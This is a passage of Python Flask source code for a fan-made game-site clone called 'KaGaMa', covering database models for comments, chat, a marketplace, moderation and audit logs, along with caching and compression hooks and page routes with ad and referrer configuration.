                safe_featured.append(item)
            else:
                continue
        if not safe_featured:
            safe_featured = [{
                "url": "https://via.placeholder.com/1200x400/1a1a2e/ffffff?text=KaGaMa+News",
                "alt": "KaGaMa News"
            }]
        status = self.computed_status()
        pinned_label = "published+pinned" if (status == "published" and self.is_pinned) else status
        return {
            "id": self.id,
            "profile_id": self.profile_id,
            "profile_username": self.profile_username,
            "title": self.title,
            "excerpt": self.excerpt,
            "body_html": self.body_html,
            "created": self.created.isoformat(),
            "updated": self.updated.isoformat() if self.updated else None,
            "language": self.language,
            "published": self.published.isoformat(),
            "is_published": self.is_published,
            "is_pinned": self.is_pinned,
            "is_archived": self.is_archived,
            "scheduled_publish_at": self.scheduled_publish_at.isoformat() if self.scheduled_publish_at else None,
            "status": status,
            "status_label": pinned_label,
            "featured_image_id": 0,
            "featured_images": safe_featured,
            "support_image": self.support_image or ""
        }

class FeedComment(db.Model):
    __tablename__ = 'feed_comments'
    id = db.Column(db.Integer, primary_key=True)
    profile_id = db.Column(db.Integer, nullable=False)
    _data = db.Column(db.Text, nullable=False)
    created = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc), nullable=False)
    object_id = db.Column(db.Integer, nullable=False)
    object_type = db.Column(db.String(50), default="news_feed")
    profile_username = db.Column(db.String(150), nullable=False)
    images = db.Column(db.Text, nullable=False)
    avatar_id = db.Column(db.Integer, nullable=True)
    is_subscriber = db.Column(db.Boolean, default=False)
    can_delete = db.Column(db.Boolean, default=False)
    def to_dict(self):
        utc_timestamp = self.created
        if utc_timestamp is None:
            utc_timestamp = datetime.now(timezone.utc)
        elif utc_timestamp.tzinfo is None:
            utc_timestamp = utc_timestamp.replace(tzinfo=timezone.utc)
        return {
            "id": self.id,
            "profile_id": self.profile_id,
            "_data": self._data,
            "created": utc_timestamp.isoformat(),
            "object_id": self.object_id,
            "object_type": self.object_type,
            "profile_username": self.profile_username,
            "images": json.loads(self.images),
            "avatar_id": self.avatar_id,
            "is_subscriber": self.is_subscriber,
            "can_delete": self.can_delete
        }

class ChatMessage(db.Model):
    __tablename__ = 'chat_messages'
    id = db.Column(db.Integer, primary_key=True)
    from_profile_id = db.Column(db.Integer, nullable=False)
    from_username = db.Column(db.String(150), nullable=False)
    friend_profile_id = db.Column(db.Integer, nullable=False)
    message = db.Column(db.String(150), nullable=False)
    created = db.Column(db.DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)
    def to_dict(self):
        utc_timestamp = self.created
        if utc_timestamp is None:
            utc_timestamp = datetime.now(timezone.utc)
        elif utc_timestamp.tzinfo is None:
            utc_timestamp = utc_timestamp.replace(tzinfo=timezone.utc)
        return {
           "id": self.id,
           "from_profile_id": self.from_profile_id,
           "from_username": self.from_username,
           "friend_profile_id": self.friend_profile_id,
           "message": self.message,
           "created": self.created.isoformat()
        }

# ==================================================
#  NEW MARKETPLACE MODEL
# ==================================================
class MarketplaceListing(db.Model):
    __tablename__ = 'marketplace_listings'
    id = db.Column(db.Integer, primary_key=True)
    seller_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    item_type = db.Column(db.String(50), nullable=False)  # 'avatar', 'game_asset', 'skin', etc.
    item_id = db.Column(db.Integer, nullable=False)      # ID of the specific item (e.g., avatar_id)
    price_gold = db.Column(db.Integer, nullable=False)
    description = db.Column(db.String(500), nullable=True)
    created_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc), nullable=False)
    expires_at = db.Column(db.DateTime, nullable=True)   # optional expiration
    is_active = db.Column(db.Boolean, default=True, nullable=False)

    seller = db.relationship('User', backref='listings')

    def to_dict(self):
        det = self._get_item_details() or {}
        d = {
            'id': self.id,
            'seller_id': self.seller_id,
            'seller_username': self.seller.username if self.seller else 'Unknown',
            'item_type': self.item_type,
            'item_id': self.item_id,
            'category': self.item_type,
            'product_id': self.id,
            'price_gold': self.price_gold,
            'price_old': self.price_gold,
            'description': self.description,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'expires_at': self.expires_at.isoformat() if self.expires_at else None,
            'is_active': self.is_active,
            'likes_count': 0,
            'sold_count': 0,
            'item_details': det
        }
        if det:
            d['name'] = det.get('name')
            d['images'] = det.get('images')
            d['created'] = det.get('created')
            d['author_profile_id'] = det.get('author_profile_id')
            d['creator'] = det.get('creator')
        return d

    def _get_item_details(self):
        if self.item_type == 'avatar':
            avatar = db.session.query(Avatar).filter_by(id=self.item_id).first()
            if avatar:
                d = avatar.to_dict()
                d['name'] = d.get('avatar_name')
                d['price_gold'] = self.price_gold
                d['created'] = self.created_at.isoformat() if self.created_at else None
                d['author_profile_id'] = self.seller_id
                d['creator'] = self.seller.username if self.seller else 'KaGaMa'
                return d
        # add other item types later (e.g., 'game_asset', 'skin')
        return None


# ==================================================
#  ADMIN PANEL EXPANSION MODELS (Phase 0)
# ==================================================

class Report(db.Model):
    __tablename__ = 'reports'
    id = db.Column(db.Integer, primary_key=True)
    reporter_id = db.Column(db.Integer, nullable=True)
    reporter_username = db.Column(db.String(150), nullable=True)
    reported_user_id = db.Column(db.Integer, nullable=True)
    reported_username = db.Column(db.String(150), nullable=True)
    report_type = db.Column(db.String(50), nullable=False)
    reason = db.Column(db.Text, nullable=True)
    details = db.Column(db.Text, nullable=True)
    evidence_url = db.Column(db.String(500), nullable=True)
    status = db.Column(db.String(20), default='pending', nullable=False)  # pending/accepted/rejected/archived
    admin_note = db.Column(db.Text, nullable=True)
    contact_reporter = db.Column(db.Boolean, default=False)
    ban_action = db.Column(db.Boolean, default=False)
    resolved_by = db.Column(db.Integer, nullable=True)
    resolved_at = db.Column(db.DateTime(timezone=True), nullable=True)
    created = db.Column(db.DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)

    def to_dict(self):
        return {
            'id': self.id,
            'reporter_id': self.reporter_id,
            'reporter_username': self.reporter_username,
            'reported_user_id': self.reported_user_id,
            'reported_username': self.reported_username,
            'report_type': self.report_type,
            'reason': self.reason,
            'details': self.details,
            'evidence_url': self.evidence_url,
            'status': self.status,
            'admin_note': self.admin_note,
            'contact_reporter': self.contact_reporter,
            'ban_action': self.ban_action,
            'resolved_by': self.resolved_by,
            'resolved_at': self.resolved_at.isoformat() if self.resolved_at else None,
            'created': self.created.isoformat()
        }


class AuditLog(db.Model):
    __tablename__ = 'audit_logs'
    id = db.Column(db.Integer, primary_key=True)
    actor_id = db.Column(db.Integer, nullable=True)
    actor_username = db.Column(db.String(150), nullable=True)
    action = db.Column(db.String(100), nullable=False)
    target_type = db.Column(db.String(50), nullable=True)
    target_id = db.Column(db.Integer, nullable=True)
    details = db.Column(db.Text, nullable=True)
    created = db.Column(db.DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)

    def to_dict(self):
        return {
            'id': self.id,
            'actor_id': self.actor_id,
            'actor_username': self.actor_username,
            'action': self.action,
            'target_type': self.target_type,
            'target_id': self.target_id,
            'details': self.details,
            'created': self.created.isoformat()
        }


class GoldTransaction(db.Model):
    __tablename__ = 'gold_transactions'
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, nullable=False)
    user_username = db.Column(db.String(150), nullable=True)
    amount = db.Column(db.Integer, nullable=False)  # signed
    balance_after = db.Column(db.Integer, nullable=True)
    reason = db.Column(db.String(200), nullable=True)
    admin_id = db.Column(db.Integer, nullable=True)
    created = db.Column(db.DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)

    def to_dict(self):
        return {
            'id': self.id,
            'user_id': self.user_id,
            'user_username': self.user_username,
            'amount': self.amount,
            'balance_after': self.balance_after,
            'reason': self.reason,
            'admin_id': self.admin_id,
            'created': self.created.isoformat()
        }


class XpLog(db.Model):
    __tablename__ = 'xp_logs'
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, nullable=False)
    user_username = db.Column(db.String(150), nullable=True)
    amount = db.Column(db.Integer, nullable=False)  # signed
    level_before = db.Column(db.Integer, nullable=True)
    level_after = db.Column(db.Integer, nullable=True)
    reason = db.Column(db.String(200), nullable=True)
    admin_id = db.Column(db.Integer, nullable=True)
    created = db.Column(db.DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)

    def to_dict(self):
        return {
            'id': self.id,
            'user_id': self.user_id,
            'user_username': self.user_username,
            'amount': self.amount,
            'level_before': self.level_before,
            'level_after': self.level_after,
            'reason': self.reason,
            'admin_id': self.admin_id,
            'created': self.created.isoformat()
        }


class LoginHistory(db.Model):
    __tablename__ = 'login_history'
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, nullable=True)
    username = db.Column(db.String(150), nullable=True)
    ip = db.Column(db.String(64), nullable=True)
    user_agent = db.Column(db.Text, nullable=True)
    success = db.Column(db.Boolean, default=True)
    created = db.Column(db.DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)

    def to_dict(self):
        return {
            'id': self.id,
            'user_id': self.user_id,
            'username': self.username,
            'ip': self.ip,
            'user_agent': self.user_agent,
            'success': self.success,
            'created': self.created.isoformat()
        }


class Badge(db.Model):
    __tablename__ = 'badges'
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(150), nullable=False)
    icon_url = db.Column(db.Text, nullable=True)
    rarity = db.Column(db.String(30), default='common', nullable=False)  # common/rare/epic/legendary
    is_hidden = db.Column(db.Boolean, default=False, nullable=False)
    is_exclusive = db.Column(db.Boolean, default=False, nullable=False)
    is_event = db.Column(db.Boolean, default=False, nullable=False)
    created = db.Column(db.DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)

    def to_dict(self):
        return {
            'id': self.id,
            'name': self.name,
            'icon_url': self.icon_url,
            'rarity': self.rarity,
            'is_hidden': self.is_hidden,
            'is_exclusive': self.is_exclusive,
            'is_event': self.is_event,
            'created': self.created.isoformat()
        }


class UserBadge(db.Model):
    __tablename__ = 'user_badges'
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, nullable=False)
    badge_id = db.Column(db.Integer, nullable=False)
    awarded_by = db.Column(db.Integer, nullable=True)
    awarded_at = db.Column(db.DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)
    note = db.Column(db.Text, nullable=True)

    def to_dict(self):
        badge = db.session.get(Badge, self.badge_id)
        return {
            'id': self.id,
            'user_id': self.user_id,
            'badge_id': self.badge_id,
            'badge_name': badge.name if badge else None,
            'badge_icon': badge.icon_url if badge else None,
            'awarded_by': self.awarded_by,
            'awarded_at': self.awarded_at.isoformat(),
            'note': self.note
        }


class ModerationAction(db.Model):
    __tablename__ = 'moderation_actions'
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, nullable=False)
    user_username = db.Column(db.String(150), nullable=True)
    actor_id = db.Column(db.Integer, nullable=True)
    actor_username = db.Column(db.String(150), nullable=True)
    action_type = db.Column(db.String(50), nullable=False)
    reason = db.Column(db.Text, nullable=True)
    details = db.Column(db.Text, nullable=True)
    expires_at = db.Column(db.DateTime(timezone=True), nullable=True)
    created = db.Column(db.DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)

    def to_dict(self):
        return {
            'id': self.id,
            'user_id': self.user_id,
            'user_username': self.user_username,
            'actor_id': self.actor_id,
            'actor_username': self.actor_username,
            'action_type': self.action_type,
            'reason': self.reason,
            'details': self.details,
            'expires_at': self.expires_at.isoformat() if self.expires_at else None,
            'created': self.created.isoformat()
        }


class StaffPermissionGroup(db.Model):
    __tablename__ = 'staff_permission_groups'
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    permissions = db.Column(db.Text, nullable=True)  # JSON list
    created_by = db.Column(db.Integer, nullable=True)
    created = db.Column(db.DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)

    def to_dict(self):
        return {
            'id': self.id,
            'name': self.name,
            'permissions': json.loads(self.permissions) if self.permissions else [],
            'created_by': self.created_by,
            'created': self.created.isoformat()
        }


class FeatureFlag(db.Model):
    __tablename__ = 'feature_flags'
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(100), unique=True, nullable=False)
    name = db.Column(db.String(150), nullable=False)
    enabled = db.Column(db.Boolean, default=False, nullable=False)
    description = db.Column(db.Text, nullable=True)
    updated_by = db.Column(db.Integer, nullable=True)
    updated_at = db.Column(db.DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)

    def to_dict(self):
        return {
            'id': self.id,
            'key': self.key,
            'name': self.name,
            'enabled': self.enabled,
            'description': self.description,
            'updated_by': self.updated_by,
            'updated_at': self.updated_at.isoformat()
        }


class SiteAlert(db.Model):
    __tablename__ = 'site_alerts'
    id = db.Column(db.Integer, primary_key=True)
    message = db.Column(db.Text, nullable=False)
    level = db.Column(db.String(20), default='info', nullable=False)  # info/warning/danger/success
    active = db.Column(db.Boolean, default=True, nullable=False)
    created_by = db.Column(db.Integer, nullable=True)
    created = db.Column(db.DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)

    def to_dict(self):
        return {
            'id': self.id,
            'message': self.message,
            'level': self.level,
            'active': self.active,
            'created_by': self.created_by,
            'created': self.created.isoformat()
        }


class Announcement(db.Model):
    __tablename__ = 'announcements'
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(200), nullable=False)
    body_html = db.Column(db.Text, nullable=True)
    active = db.Column(db.Boolean, default=True, nullable=False)
    created_by = db.Column(db.Integer, nullable=True)
    created = db.Column(db.DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)

    def to_dict(self):
        return {
            'id': self.id,
            'title': self.title,
            'body_html': self.body_html,
            'active': self.active,
            'created_by': self.created_by,
            'created': self.created.isoformat()
        }


# ==================================================
#  REST OF YOUR EXISTING CODE (routes, error handlers, etc.)
#  Everything below this point is unchanged except for the addition of
#  the marketplace routes which we insert after your existing routes.
# ==================================================

@login_manager.user_loader
def load_user(user_id):
    return db.session.get(User, int(user_id))

@app.before_request
def check_current_user_ban():
    if current_user.is_authenticated:
        if current_user.is_banned or (current_user.ban_expires and current_user.ban_expires > datetime.now(timezone.utc)):
            logout_user()

@app.after_request
def rewrite_archive_urls(response):
    if request.path.startswith('/static/'):
        return response
    ct = response.content_type or ''
    if 'text/html' not in ct:
        return response
    try:
        body = response.get_data(as_text=True)
        if 'web.archive.org' not in body and 'kogstatic.com' not in body:
            return response
        import re as _re
        def _repl(m):
            url = m.group(0)
            return '/img_proxy?url=' + url
        new_body = _re.sub(r'https?://web\.archive\.org/[^\s"\'<>]+', _repl, body)
        response.set_data(new_body)
        response.headers.pop('Content-Length', None)
    except Exception:
        pass
    return response

@app.after_request
def no_cache_html(response):
    ct = response.content_type or ''
    if 'text/html' in ct and not request.path.startswith('/static/'):
        response.headers['Cache-Control'] = 'no-cache'
        response.headers.pop('Expires', None)
    return response

# ==================================================
#  PERFORMANCE: lightweight in-memory response cache
#  (anonymous GET only, for safe public endpoints)
# ==================================================
import time as _cache_time
from functools import wraps as _fwraps

_RESP_CACHE = {}
_RESP_CACHE_EXPIRY = {}
_RESP_CACHE_MAX = 100  # max entries to prevent unbounded memory growth

def _cache_cleanup():
    """Evict expired entries and enforce max size."""
    now = _cache_time.time()
    expired = [k for k, exp in _RESP_CACHE_EXPIRY.items() if exp <= now]
    for k in expired:
        _RESP_CACHE.pop(k, None)
        _RESP_CACHE_EXPIRY.pop(k, None)
    # If still over limit, evict oldest first
    while len(_RESP_CACHE) > _RESP_CACHE_MAX:
        oldest_key = min(_RESP_CACHE_EXPIRY, key=_RESP_CACHE_EXPIRY.get)
        _RESP_CACHE.pop(oldest_key, None)
        _RESP_CACHE_EXPIRY.pop(oldest_key, None)

def cache_anon(ttl):
    def decorator(fn):
        @_fwraps(fn)
        def wrapper(*args, **kwargs):
            if request.method != 'GET':
                return fn(*args, **kwargs)
            if current_user.is_authenticated:
                return fn(*args, **kwargs)
            if len(_RESP_CACHE) > _RESP_CACHE_MAX:
                _cache_cleanup()
            key = request.path + '|' + request.query_string.decode('utf-8', 'ignore')
            now = _cache_time.time()
            hit = _RESP_CACHE.get(key)
            if hit is not None and _RESP_CACHE_EXPIRY.get(key, 0) > now:
                body, status, headers = hit
                r = make_response(body, status)
                for k, v in headers.items():
                    r.headers[k] = v
                r.headers['X-Cache'] = 'HIT'
                return r
            result = fn(*args, **kwargs)
            try:
                resp = make_response(result)
            except Exception:
                # Non-Response return (e.g. a bare dict) - let Flask handle it.
                return result
            try:
                if resp.status_code == 200:
                    body = resp.get_data()
                    headers = {k: v for k, v in resp.headers.items()
                               if k.lower() not in ('set-cookie', 'content-length')}
                    _RESP_CACHE[key] = (body, resp.status_code, headers)
                    _RESP_CACHE_EXPIRY[key] = now + ttl
            except Exception:
                pass
            return resp
        return wrapper
    return decorator


@app.after_request
def add_static_cache_headers(response):
    if response.status_code != 200:
        return response
    # --- Compression (gzip) ---
    # PythonAnywhere's front-end nginx may already gzip static assets, but the
    # dynamic HTML (profile pages, etc.) is not guaranteed to be compressed.
    # Doing it here guarantees text responses are compressed regardless.
    ctype = (response.content_type or '').split(';')[0].strip().lower()
    _gzip_types = {
        'text/html', 'application/javascript', 'application/x-javascript',
        'text/css', 'application/json', 'text/xml', 'application/xml',
        'text/plain',
    }
    if ('gzip' in request.headers.get('Accept-Encoding', '') and ctype in _gzip_types
            and not response.headers.get('Content-Encoding')):
        try:
            # Static files are served with direct_passthrough=True; disable it
            # so we can read + replace the body with the gzipped version.
            response.direct_passthrough = False
            data = response.get_data()
            if data and len(data) > 500:
                response.set_data(_gzip.compress(data, 6))
                response.headers['Content-Encoding'] = 'gzip'
                response.headers['Vary'] = 'Accept-Encoding'
        except Exception as _ge:
            app.logger.warning("gzip skipped: %s", _ge)
    # --- Cache headers ---
    ct = response.content_type or ''
    if request.path.startswith('/static/'):
        if '/static/app.js' in request.path:
            response.headers['Cache-Control'] = 'public, max-age=86400, immutable'
        else:
            response.headers['Cache-Control'] = 'public, max-age=86400'
        # Drop "Vary: Cookie" so the (identical) static asset can be cached
        # across users / by shared caches. Keep "Vary: Accept-Encoding".
        varies = [v for v in response.headers.getlist('Vary')
                  if v.lower() != 'cookie']
        response.headers.pop('Vary', None)
        for v in varies:
            response.headers.add('Vary', v)
        if 'accept-encoding' not in [v.lower() for v in response.headers.getlist('Vary')]:
            response.headers.add('Vary', 'Accept-Encoding')
        response.headers['X-Cache'] = 'STATIC'
    elif 'text/html' in ct:
        response.headers['Cache-Control'] = 'no-cache, must-revalidate'
        response.headers.pop('ETag', None)
    return response


@app.route('/games/')
@app.route('/')
def home():
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    object_data = {
       "ADSONPAGE": True,
       "category": None,
       "locale": user_language,
       "referrers": [
          {
             "referrer_id": 1,
             "name": "Kagama",
             "codename": "kogama",
             "urls": ""
          },
          {
             "referrer_id": 2,
             "name": "old_spilgames",
             "codename": "OldSpilGames",
             "urls": ""
          },
          {
             "referrer_id": 3,
             "name": "AdNPlay",
             "codename": "adnplay",
             "urls": ""
          },
          {
             "referrer_id": 4,
             "name": "GSM",
             "codename": "gsm",
             "urls": "games\\.poki\\.com|1001oyun\\.com|123pelit\\.com|gamesfreak\\.net|hrajhry\\.sk|jeuxjeuxjeux\\.ch|jeuxjeuxjeux\\.fr|megajatek\\.hu|megaspel\\.se|moiteigri\\.com|paisdelosjuegos\\.cl|paisdelosjuegos\\.co\\.ve|paisdelosjuegos\\.com\\.ar|paisdelosjuegos\\.com\\.co|paisdelosjuegos\\.com\\.do|paisdelosjuegos\\.com\\.ec|paisdelosjuegos\\.com\\.mx|paisdelosjuegos\\.com\\.pa|paisdelosjuegos\\.com\\.pe|paisdelosjuegos\\.com\\.uy|paisdelosjuegos\\.cr|paisdelosjuegos\\.es|poki\\.at|poki\\.be|poki\\.by|poki\\.cn|poki\\.co\\.il|poki\\.com|poki\\.com\\.br|poki\\.cz|poki\\.de|poki\\.dk|poki\\.gr|poki\\.it|poki\\.jp|poki\\.nl|poki\\.no|poki\\.pl|poki\\.pt|poki\\.ro|spielyeti\\.ch|trochoi\\.net"
          },
          {
             "referrer_id": 5,
             "name": "Miniplay",
             "codename": "miniplay",
             "urls": "minijuegos\\.com|miniplay\\.com|minigiochi\\.com|minijogos\\.com\\.br|minijuegos\\.es|minijuegosgratis\\.com"
          },
          {
             "referrer_id": 6,
             "name": "ORANGE",
             "codename": "orange",
             "urls": "kizi\\.com|yepi\\.com|bgames\\.com|huz\\.com|spele\\.nl|spele\\.be|keygames\\.com|oyungemisi\\.com|spielspiele\\.de|spelletjesoverzicht\\.nl|games\\.co\\.za|spiels\\.at|spiels\\.ch|kilitoyun\\.com|hryhry\\.net|starbie\\.nl|starbie\\.co\\.uk|minigioco\\.it|pelaaleikkia\\.com|jouerjouer\\.com|clavejuegos\\.com|1001igry\\.ru|m\\.1001igry\\.ru|nyckelspel\\.se|waznygry\\.pl|jogojogar\\.com|youdagames\\.com|zigiz\\.com|stratego\\.com|gembly\\.com|cadajogo\\.cocadajogo\\.com|cadajuego\\.es|funny-games\\.co\\.uk|m\\.funny-games\\.co\\.uk|funnygames\\.asia|funnygames\\.at|funnygames\\.be|funnygames\\.befr|funnygames\\.biz|funnygames\\.ch|funnygames\\.cn|funnygames\\.co\\.id|funnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.dk|funnygames\\.es|funnygames\\.eu|funnygames\\.fi|funnygames\\.fr|funnygames\\.gr|funnygames\\.hu|funnygames\\.ie|funnygames\\.in|funnygames\\.ir|funnygames\\.it|funnygames\\.jp|funnygames\\.kr|funnygames\\.lt|funnygames\\.nl|funnygames\\.no|funnygames\\.org|funnygames\\.ph|funnygames\\.pk|funnygames\\.pl|funnygames\\.pt|funnygames\\.ro|funnygames\\.ru|funnygames\\.se|funnygames\\.us|funnygames\\.vn|misjuegos\\.com|m\\.misjuegos\\.com"
          },
          {
             "referrer_id": 7,
             "name": "CRAZYGAMES",
             "codename": "crazygames",
             "urls": "crazygames\\.com|1001juegos\\.com|gioca\\.re|speelspelletjes\\.nl|onlinegame\\.co\\.id"
          },
          {
             "referrer_id": 8,
             "name": "SpilGames",
             "codename": "spilgames",
             "urls": "cdn\\.gameplayer\\.io|a10\\.com|girlsgogames\\.com|girlsgogames\\.ru|juegosdechicas\\.com|gry\\.pl|juegos\\.com|girlsgogames\\.fr|oyunskor\\.com|girlsgogames\\.pl|girlsgogames\\.co\\.uk|girlsgogames\\.com\\.br|girlsgogames\\.it|agame\\.com|girlsgogames\\.de|games\\.co\\.id|girlsgogames\\.nl|jeux\\.fr|girlsgogames\\.co\\.id|jeu\\.fr|spel\\.nl|flashgames\\.ru|girlsgogames\\.com\\.tr|gioco\\.it|zapjuegos\\.com|spelletjes\\.nl|spielen\\.com|ourgames\\.ru|girlsgogames\\.se|gamesgames\\.com|jetztspielen\\.de|ojogos\\.com\\.br|ojogos\\.pt|spela\\.se|giochi\\.it|spel\\.se|oyunoyna\\.com|games\\.co\\.uk|permainan\\.co\\.id"
          }
       ],
       "ads_data": {
          "host": "www.kogama.com",
          "ref": 1,
          "consent": True,
          "name": "Google AdManager (old account)",
          "ads": {
             "top_banner": {
                "num": "0",
                "id": "kogama_mobile_leaderboard_1",
                "ad_unit_code": "leaderboard",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "skyscraper_left": {
                "num": "1",
                "id": "kogama-skyscraper-left",
                "ad_unit_code": "skyscraper_left",
                "sizes": "[160, 600]"
             },
             "skyscraper_right": {
                "num": "2",
                "id": "kogama-skyscraper-right",
                "ad_unit_code": "skyscraper",
                "sizes": "[160, 600]"
             },
             "bottom_banner": {
                "num": "4",
                "id": "kogama_mobile_leaderboard_2",
                "ad_unit_code": "leaderboard_bottom",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "comment_ad": {
                "num": "5",
                "id": "kogama_rectangle",
                "ad_unit_code": "rectangle",
                "sizes": "[300, 250]"
             },
             "wide_skyscraper": {
                "num": "3",
                "id": "kogama-wide-skyscraper",
                "ad_unit_code": "wide_skyscraper",
                "sizes": "[300, 600]"
             },
             "game_list_banner": {
                "num": "6",
                "id": "kogama_mobile_game_list_banner",
                "ad_unit_code": "game_list_banner",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             }
          },
          "network_code": "46278883"
       }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data="null", submenu_data="null", object_data=object_data), 200

DEFAULT_LEVEL_IMAGE = {
    "small": "",
    "medium": "",
    "large": "",
    "image_path_url": "",
    "image_path": ""
}


def get_level_images(level):
    return User.LEVEL_IMAGES_MAP.get(level, DEFAULT_LEVEL_IMAGE)


@app.route('/build/')
def build_page():
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    object_data = {
       "ADSONPAGE": True,
       "category": None,
       "locale": user_language,
       "referrers": [
          {
             "referrer_id": 1,
             "name": "Kagama",
             "codename": "kogama",
             "urls": ""
          },
          {
             "referrer_id": 2,
             "name": "old_spilgames",
             "codename": "OldSpilGames",
             "urls": ""
          },
          {
             "referrer_id": 3,
             "name": "AdNPlay",
             "codename": "adnplay",
             "urls": ""
          },
          {
             "referrer_id": 4,
             "name": "GSM",
             "codename": "gsm",
             "urls": "games\\.poki\\.com|1001oyun\\.com|123pelit\\.com|gamesfreak\\.net|hrajhry\\.sk|jeuxjeuxjeux\\.ch|jeuxjeuxjeux\\.fr|megajatek\\.hu|megaspel\\.se|moiteigri\\.com|paisdelosjuegos\\.cl|paisdelosjuegos\\.co\\.ve|paisdelosjuegos\\.com\\.ar|paisdelosjuegos\\.com\\.co|paisdelosjuegos\\.com\\.do|paisdelosjuegos\\.com\\.ec|paisdelosjuegos\\.com\\.mx|paisdelosjuegos\\.com\\.pa|paisdelosjuegos\\.com\\.pe|paisdelosjuegos\\.com\\.uy|paisdelosjuegos\\.cr|paisdelosjuegos\\.es|poki\\.at|poki\\.be|poki\\.by|poki\\.cn|poki\\.co\\.il|poki\\.com|poki\\.com\\.br|poki\\.cz|poki\\.de|poki\\.dk|poki\\.gr|poki\\.it|poki\\.jp|poki\\.nl|poki\\.no|poki\\.pl|poki\\.pt|poki\\.ro|spielyeti\\.ch|trochoi\\.net"
          },
          {
             "referrer_id": 5,
             "name": "Miniplay",
             "codename": "miniplay",
             "urls": "minijuegos\\.com|miniplay\\.com|minigiochi\\.com|minijogos\\.com\\.br|minijuegos\\.es|minijuegosgratis\\.com"
          },
          {
             "referrer_id": 6,
             "name": "ORANGE",
             "codename": "orange",
